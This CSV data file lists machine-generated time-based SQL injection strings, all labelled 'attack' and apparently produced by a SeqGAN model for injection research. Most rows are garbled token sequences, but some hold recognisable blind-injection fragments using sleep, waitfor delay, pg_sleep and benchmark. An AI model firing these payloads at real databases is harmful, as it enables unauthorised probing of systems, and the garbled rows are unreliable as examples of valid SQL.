label,payload,family,payload_type,method,run_id,sample_index
attack,"sleep  (  5000000,m "" or sleep  (  __TIME__  )    =  ""   )     waitfor 2388 delay , delay or  or delay when --TIME_TI,#",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,113
attack,""" where if '0:0:__TIME__', delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,114
attack,"""  (  )    a asein  =  = waitfor 8781 from or waitfor delay and       =  =  8036 --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,115
attack,"""o)    or sleep  (  _TIME__TIME_TIMemlt,25,1   )        )    ase  =vio  e(  )    and    8781  5466  =  (  5  )  f0 7739 delay 4287  (  7739 '0:0:2' or when delay 7629 ) from * delay benchmark  (  6272   (    )    = 8781  (  =  =  delay  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,116
attack,""" )    as e x  (  ' --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,117
attack,"1' if where 5702 delay  =not and=  "" * 5702 not benchmark  (  (  3114  =  5  ifd or from  =     =    (    select  24  sleep  (  5702 not  (  not 5702 6784 (  =    s 5466  =  (  6456 eltl and  s 1361 '0:0:__TIME__'9443 delay delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,118
attack,k)    a:if al ellt  (  (  f andu and where not  =  )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,119
attack,1 )    asiopelost q  or  (  0 waitfor delay or  if  delay and '0:0:2' -- --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,120
attack,"1'||  (  select ':asrbi0ny  (  ;,ss wheree from from not  (    =   and if  =  =  sleep  (  "" or pg_sleep   9862  =  (  )    8036 waitfor  '0:0:2' and ""  from   = 8594 waitfor noto waitfor delay '0:0:__TIME__' delay froms not benchmark  (  10000000,m 'sysadmin'  )  )    aawaitfor '0:0:2' not  (  =  ,sleep  (  = from delay 9862 6784 from  elt where=  (g  =  =  =  s  (",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,121
attack,""" 25 sleep  =  l from '0:0:__TIME__' delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,122
attack, (  ' from  from bltt  =  =   delay  l '0:0:2' and from esleep  (  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,123
attack,"1   (  )    ase <2388  (   delay not  (  )    a""  )   rlike sleep  (  5  )   and   (  ""le s  delay from waitfor if if  26577260   not  =  =  x 8036 --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,124
attack,"1'||  (  select 'iopf waitfor 4287 waitfor benchmark  =    (  select not  =  5  Mem,Mus esiyt  )  )   )   waitfor from elit  (  )  =  6456waitfor delay  =   2657      from not  =  = '0:0:2' from from not  (  3114",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,125
attack,1'||  (  select 'nkg =    r  	  <>semno     delay when fromi where when  8036 delay and and not  (  3114  =  E '0:0:2' if not delay 8466 from fromsleep  (  (  (  5873   delay --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,126
attack,"1   )    or 3824  =  ,waitfors delay and where  = where 2840 * -- delay or =  =  ( (  )        )  or 1  = u     8781 @5  =  =  5702  = delay",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,127
attack,"1'||  (  select 't"" or sleep  (  __TIME__  )    =  """"  "" or sleep  (  __TIME__  )    =  "" 7260  (  'isintegratedsecurityonly' benchmark  =    (  select 9443 not  = sleep  (  5   )    )    or benchmark  (  5  )  )   or benchmark  =  sleep  benchmark  )    'enpn'(    )    (    )    )    szeezxvet  =  )  (    (  ' if not  =    )    )     )    as zdelay where , delay 1361 delay or delay 0 if '0:0:__TIME__'Tu or ,u sleep  (  )  else",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,128
attack,"1'  )    ascis  ""  )  or benchmark  (  )    )    )    and 8036 from pg_sleep  (  benchmark  (  (  (  =  sleep  (  0x544d5a4c_TIME__  5   )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,129
attack,"1,1""1"" )   ifor waitfor from 2388  =    if or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,130
attack,"1%'   )    as where where 7260 from not l  (  6784 and delay from delay delay '0:0:2' '0:0:__TIME__''0:0:2' delay '0:0:2' * 9443 delay 5vr delay ,benchmark  s  ey  (  )    )waitfor '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,131
attack,";waitfor delay as delay not    (  5873 '0:0:2' 4240 6456 '0:0:__TIME__'=  (  sleep delay delay not  =      =  ', from not  (     6784 not  =  benchmark  (  )    end  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,132
attack,"1""   )    aa",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,133
attack,1'   )    as io  @h where where 9862 '0:0:2' '0:0:__TIME__'sleep  not  (  'isintegratedsecurityonly'  delay '0:0:2' delay  = delay '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,134
attack,"1"" <> from *   and if '0:0:2't  (  =  sleep 4287 '0:0:__TIME__'1361   '0:0:2' =  8036 2388  7739 7260  =  (    e waitfor 7260  =  =  ' 1361 from and     9443 and not  2840 ,25, waitfor  and '0:0:2' 0 from from from 6784 waitfor '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,135
attack,"%""  1   )    as cee1  )    a<>",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,136
attack,"""   )    or    9862 4240  # sleep  (  TIM  (  )    from and  or from    (  6866 from pg_sleep  (    )  ,--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,137
attack,"; from delay '0:0:__TIME__'-- and e where '0:0:2' where  =  select '0:0:__TIME__' 8466lt 8140 waitfor delay delay 5702  =  =    = 2657  =  sleep e     delay where '0:0:__TIME__'   waitfor * delay '0:0:__TIME__'9443 delay8036  =u   )""waitfor from  '0:0:2' benchmark  substring 7739  (  =l delay and if   from where where  =    =   =  2657 waitfor  not  =  =  =  sleep  =waitfor  = 4287    ,(  =  and where  = or or ,sleep",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,138
attack,"""   )    )    or sleep  (  __TIME__  )    =  "" where 8036 delay -- from sleep  (  7260  =  sleep  (  =selt  5  ,mu  ,1   )   > ac""  )   or sleep  (  __TIME__  )    =  "" et if elllt  (  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,139
attack,"1  0x6d457153' waitfor delay not        (   when z vel delay ) delay <> I   =  )    al not d' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'  2840  )     '0:0:2' '0:0:__TIME__'sleep  _  =  6456 delay =  (  = 5466  (  =  s q (  =  if or 6969  (  ( '0:0:2' if 0  (  =  , not 7629 delay  =    =  =  )    1361 delay  )     delay  4287  (  2657 pg_sleep or and (     (  ' not  (  T,m benchmark  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,140
attack,1' <> 4287  =  (  sleep   benchmark  (  )  select  from delay '0:0:2' delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,141
attack,"1 sleep  (  select not  (  8036  )    = waitfor 6793l(  (   )    waitfor and waitfor or (  r   end where  =  (  =   s x@veetuwhereand"" l (   if '0:0:2' 8036 bs not  =  from 8781 8781  (  =  ="" where not  =  '0:0:2' delay --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,142
attack,"1 s where 4287""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""  s delay 8036 '0:0:2' ellt from ellt  (  0x6d457153    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,143
attack,""" 1""   )    or --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,144
attack,4240  '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,145
attack,1 )aas . bspiaoor 7260  (  (  select delay not  )    )   end    8140 and 8594 and    and # from,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,146
attack,"1""   )  waitfors where delay t where  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,147
attack,1'   )    waitfor delay delay from delay delay and '0:0:2' 8036 7260 or 6866 8594  (  =    2840 delay (  (  = --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,148
attack,";"" '0:0:__TIME__'(  and and 6969  from or delay __  'isintegratedsecurityonly'  (  sleep  (  )    )    (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,149
attack,"1   =  | @vect  8140  (  'isintegratedsecurityonly'   'isintegratedsecurityonly'waitfor not  ( delay and or  ""  )   or sleep  (  __TIME__  )    =  "" benchmark  (  (  3114 or rve,r sleep  (  )    =  =  IMDo  25  ,,1  )    or sleep_(  9443 sleep  (    benchmark  10000000,mmd5  (  5000000(   (     select not  _  (  4287 delay not  =  (  =  8036 * waitfor or '0:0:2' from from 9862 50 benchmark  (  (  5   )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,150
attack,"""  ;, not  (   and  '0:0:10'not    (  =selt      ,,m x dh er or  delay   and --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,151
attack,"""o)    )and '0:0:2' delay 8036  =  ( 8781  (  =   delay --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,152
attack,"a%""  )   waitfor 6969  (  = b delay '0:0:2' 1  3885 '0:0:2' and '0:0:2' from pg_sleep  (    10000000,(   or benchmark(  0x4c4d6142   )    )    )    or --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,153
attack,1 * 8036  =  (  8140 * if delay delay '0:0:2' delay delay delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,154
attack,""",1  )  )   and sleep  (   = s 9443d d sleep  (  sleep  (  (  substring   (  5000000,ME__  5   )    benchmark  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,155
attack,"""   )    or from froms  =  (  0x6d457153   (  8781 Dehpxviosioiso  =  =  (  )--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,156
attack,"""  )    or (  (  0x6d457153 from delay and 2388  =  7260  = delay from  = y  (  select delay asiro* not  7629  (  sielt  Me1    )   <> or delay benchmark  (  5   )    waitfors 'sa' or from 8466llo delay delay '0:0:__TIME__' from delay 3885(  =  =  )o--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,157
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""t""   6866 and or or from em  2657  (  =  __s 9443  )  =  waitfor delay waitfor not  =  1",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,158
attack,""" ) where from --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,159
attack,"1%'   )    as x6456 8781  =  =    )  )    aszahv"" where eleltt  'sysadmin',  8781 E  (  (TIME 8140 2840  =  sleep  =  =sel ie sleep   =  =  (  3114 from benchmark  (  select or sleep  (  =  5 or --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,160
attack,      1   ) --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,161
attack,1 zvio  )    (    =  7739 and 8594 3885 (  =  = #e and delay n  =  = waitfor '0:0:2' delay -- '0:0:2' '0:0:10'* --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,162
attack,"1%""   )    apie    (  )    as where =  (  = if ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,163
attack,"""    )    )    a""   and""  )   rlike sleep  (  5  )   and   (  "" where 3885 1361  (  ' 2840  or delay pg_sleep  =  sleep  (  3114 8781 =  1 ;u",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,164
attack,"1""   )   or 2388  =  ' waitfor * 5702 5466        =  from  delay delayel * sleep  = 8140 5466  =  =        )     delay 8140 waitfor -- 8514 delay '0:0:2' delay ,* not  (  waitfor not  (  4287  8036 8781  select  pg_sleep  =  7739 el where  =  3114, delay =  =  =  (  0x6d457153 waitfor --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,165
attack,"1   )    <> )    or * pg_sleep  (  10000000  ,  (  = and delay  '0:0:__TIME__' 8594  = 8140 '0:0:2' if not not  (TIME___select@sleep  _  (  )    )  1    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,166
attack, )     from 9862  =  =  =  ' 8036 waitfor delay '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,167
attack,"1%""   )   or pg_sleep  (  5  'isintegratedsecurityonly'  =   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,168
attack,"1 siedo  (  )    apeeion  1  )    ) as ernpg_sleep  )  ,1  )   8594    )    or delay  from delay 4240,ME_y * '0:0:__TIME__'----",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,169
attack,"1%""  )   )    as x9862i pia:aldppg_sleep  6866  =  =  f 3114 delay delay or 8594 sleep  =  (    select or delay   (  ( fromwaitfor' elllt  (    )  or l delay  not  =  (  (  =   )    0= 8140    )    )    <> 3885 sleep  (  = 8036  =  sleep  =  7739 if and   delay from or 9443  --* from sen  (    (  )    )    : not  (  )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,170
attack,M1waitforc if from delay u * not  ( 2657 delay '0:0:__TIME__'8594 if delay delay benchmark    =  = 4287 8036      from or 6793sleep --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,171
attack,"""   )    a where  =  (  (  6866 )    =  ) waitfor not  =   delay delay '0:0:2' not  (  3114  =  md waitfor and b '0:0:2' delay delay or not  (  =__TIME_  1   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,172
attack,1'||  (  select 'si ion,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,173
attack,1   )     pg_sleep  (  3114  =  ' not from  _  =  7260 delay waitfor '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,174
attack,"@voide   (  end 2657  waitfor 3114 and delay -- '0:0:2' ( sleep waitfor  (  =  3885 not  1 end r  =  ,bveiskoser  )   )    or * delay --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,175
attack, di  )       )      waitfor n  =  )    '0:0:2' from --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,176
attack,""",dd ioe  delay  ,m p9443 not  =  6866 delay or  0(    3885  =    )   waitfor 8594    4287  '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,177
attack,";sleep  (  _  3114  = from  , from <> 7739   d where 5466 not  (  =    )    (  ,' <>  8036 delay not,sleep  (  _TIME_TI5   (  0x6d457153   )    (    )    0x694a4745    )    <> waitfor delay  not from 'sa' delay delay , ,'   delay  (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,178
attack,"lr   ,  =  (  5873  (  3114 waitfor if and 8  =  or from where (  (  = where 4287  =  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,179
attack,"""  10000000,  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,180
attack,"1"" @t   )   )    @waitfor 6969 from '0:0:2' delay  '0:0:2' or from from    (    )    )    )    )     --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,181
attack,"""  )    asn elt (  ) delay where delay --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,182
attack,"1  8036   )    7629iwaitfor '0:0:2' if delay '0:0:__TIME__'waitfor * and * benchmark  (  )    )   #    )    )    D   )    ass where 7739 y 7260  =  =  waitfor  '0:0:2' from where from elt  (  3114  =  =  et,k  =  3114 from if not  (  = and @o,  and not  (  = pg_sleep  (  =  sleep  (  =  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,183
attack,"1%'  ,1 where not  (  (  5 and    )   end    )     or pg_sleep  (  =  sleep  (  sleep  (  select",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,184
attack,""",,m 5  =  mddo  =(  "" )    as or sleep  (  3114  1  ' not  (  =  sleep  5 rioc5    M(  )    )    )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,185
attack,"1""  )   or 2388  =  sd where V' s # and s waitfor if '0:0:2'l waitfor delay not  (  =   if pg_sleep  (  8036 not  (  =  3114  o '0:0:2' '0:0:__TIME__'sleep  =  = delay waitfor '0:0:2' waitfor delay 5702 benchmark  (  !",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,186
attack,"1"",1  )    )     )    asi and  where 4287 '0:0:10'1 waitfor not  =      =  =  l po delay '0:0:2' 4240 delay 7739 delay '0:0:2' delay -- '0:0:2' * from '0:0:2' from --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,187
attack," if,waitfor delay delay  benchmark  (  )    ( waitfor not  =   delay ), ,       = not  (  benchmark  =  (  )          ,waitfor delay delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,188
attack,; from --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,189
attack,1' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,190
attack,'  (   '0:0:2' waitfor delay not  (  = -- 8466  1361 not  =    ( not  =    t  =  5466 6969 )    (  (    )   waitfor not  9443 <> benchmark  (  )    )   waitfor information_schemadelay '0:0:2' delay '0:0:2' waitfor 8594 4287  =  (  )    =  =   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,191
attack,"""  )   aselos  (  (  7629 where '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,192
attack,; delay delay '0:0:__TIME__' '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,193
attack,";"" if waitfor delay and not  (  benchmark  (  =  "" delay delay '0:0:10', '0:0:__TIME__'1 6793  '0:0:2' delay '0:0:__TIME__'benchmark  =    =  (  sleep  5702 delay '0:0:2' '0:0:10' and  delay or --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,194
attack, No delay t  (  = 5702 --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,195
attack,","" where 9443  (  IME6272e <>  )  or or 6784  6784 =  =  = delay waitfor not  (  =  sleep  )   delay not   ,substring * pg_sleep (",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,196
attack,"1%'     ,1  sleep (sleep  0x76555642  delay '0:0:2'   select '0:0:2' '0:0:__TIME__'(  ,sleep waitfor and  from from <> fromM(  )    )    as elthlpet  =  )  -- 8594 not  =    (  (  f' from delay( from e not  (   -- benchmark  (  = fromsam""   )    )    or sleep  (  __TIME__  )    =  "".elioc do or from   (  sleep  (  10000000)--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,197
attack,1%'   )    )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,198
attack,merss  ) or '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,199
attack,"1   )    a2657 we s  (select  (  select  not  =  (  ; delay . from, not  (  =   and 5466 2840 )     '0:0:2' delay not  (  = *    benchmark  (  select pg_sleep  (  select",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,200
attack,",n  =  =  (  )    as xvubarbs' xie6456elr or ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,201
attack,",1""  )   rlike sleep  (  5  )   and   (  """"  =  ""' not  (  =  sleep  5   dD5  =  sleep  @  (  select 2657   and 0  =  =  =  =  waitfor from delay =  (  =  )     or sleep  =  (  ( or benchmark  benchmark  (  )  0x6d457153  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,202
attack,"1 pg_sleep  (  5  ),    adx dus ' if from -- not  (  (  5 waitfor delay '0:0:2' delay sleep  (  =  '0:0:__TIME__'7629  (  3114 and * and from 6969 6456  =  1 from from not  (  )   ( from '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,203
attack,"""  )    as ser where  8781  =  3885 delay '0:0:__TIME__',, and delay =  5702  '0:0:2'      5702 6793 8036 ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,204
attack,"if ,me det    5  )    or where '0:0:__TIME__'----",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,205
attack,"' where  =  3114  not  =  (  T not    ,m delay'  8036  (  =  3885 '0:0:2' waitfor not  )  =    delay(  =  =  _e9862 8514  =   benchmark  (    7260  =  =  '0:0:2' delay '0:0:__TIME__'not  =  (  =  1  =   us whereel s e delay --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,206
attack,where 2840 whereT) or  =  ( delay and 2657     delay delay and *  * --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,207
attack,"1'||  (  select '/%ic'sa'"" and @v from not  (  =  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,208
attack,1'   )    asyelt  )   or delay from from  benchmark  (  benchmark  )  sleep  )  1,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,209
attack,"1%""   fzwhere  )    )    or @2840 8036  =  =  1 25 from '0:0:2' not * from sleep  (  5   )    )     eltpnderett  (  )  )     )  ;and 'sa'  waitfor from 7739 delay delay 31143824waitfor  =  (  3114 and 8594 from 4240  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,210
attack,; 6456  8781  (  6866 or from ( delay --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,211
attack,"1""   )    as whereu)    or 5466 5702 '0:0:__TIME__' delay not  =  6456 5702 '0:0:__TIME__'sleep  (  =  f 8514(  =  3114 delay from or ift 3885 sleep (  3885 delay '0:0:10'from and  =  =  ""  =  "" 8781 4240  = =   ( delay and or sleep  (  5pel5  (  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,212
attack,1 where  =    )    )    )   waitfor or waitfor delay  not  (  = waitfor sleep -- sleep  (  5  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,213
attack,1   )    awaitfor 8781 waitfor from if d not  ( waitfor --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,214
attack,"1dx 7629 benchmark  (  ) waitfor c where 5466  =  )  1 delay delay and when  =  3114or sleep  =    waitfor delay 3114(        (  substring 4240 from or and sleep  9443  (  3114  (  5   )    then from   (  10000000,mzi 0(  case or --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,215
